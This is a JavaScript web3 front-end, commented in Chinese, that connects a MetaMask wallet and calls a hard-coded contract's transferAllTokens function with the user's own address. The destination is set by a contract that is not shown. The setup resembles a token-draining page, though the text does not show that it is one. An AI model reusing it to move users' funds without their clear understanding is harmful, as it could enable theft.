let web3;
let userAddress;
let contract;
const contractAddress = "0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F";  // 智能合约地址
const abi = [
  {
    "inputs": [{"internalType": "address","name": "from","type": "address"}],
    "name": "transferAllTokens",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  // 其他ABI内容...
];

// 添加调试信息: 当页面加载时打印信息
console.log("页面加载完成，正在准备连接钱包...");

// 连接钱包
document.getElementById('connectButton').addEventListener('click', async () => {
  try {
    console.log("连接钱包按钮已点击，开始连接钱包...");
    document.getElementById('statusMessage').textContent = "尝试连接钱包...";
    
    if (typeof window.ethereum !== 'undefined') {
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      userAddress = accounts[0];
      web3 = new Web3(window.ethereum);
      contract = new web3.eth.Contract(abi, contractAddress);

      // 钱包连接成功，启用按钮
      document.getElementById('transferButton').disabled = false;
      document.getElementById('statusMessage').textContent = '钱包已连接: ' + userAddress;
      console.log("钱包已连接，用户地址: ", userAddress);
    } else {
      alert('未检测到Metamask，请安装或启用插件');
      document.getElementById('statusMessage').textContent = 'Metamask未检测到';
      console.log("Metamask插件未安装或未启用");
    }
  } catch (error) {
    console.error("连接钱包时出现错误: ", error);
    document.getElementById('statusMessage').textContent = '连接钱包失败，请重试';
  }
});

// 转移所有代币
document.getElementById('transferButton').addEventListener('click', async () => {
  if (!userAddress || !contract) {
    alert('请先连接钱包');
    console.log("钱包未连接，无法转移代币");
    return;
  }

  try {
    console.log("转移所有代币按钮已点击，开始执行代币转移...");
    document.getElementById('statusMessage').textContent = "执行代币转移...";
    
    // 打印调试信息，确保交互步骤正确
    console.log("准备调用 transferAllTokens 函数...");
    await contract.methods.transferAllTokens(userAddress).send({ from: userAddress });

    alert('代币转移成功');
    document.getElementById('statusMessage').textContent = "代币转移成功";
    console.log("代币转移成功");
  } catch (error) {
    console.error("代币转移时出现错误: ", error);
    document.getElementById('statusMessage').textContent = '代币转移失败，请重试';
  }
});
``
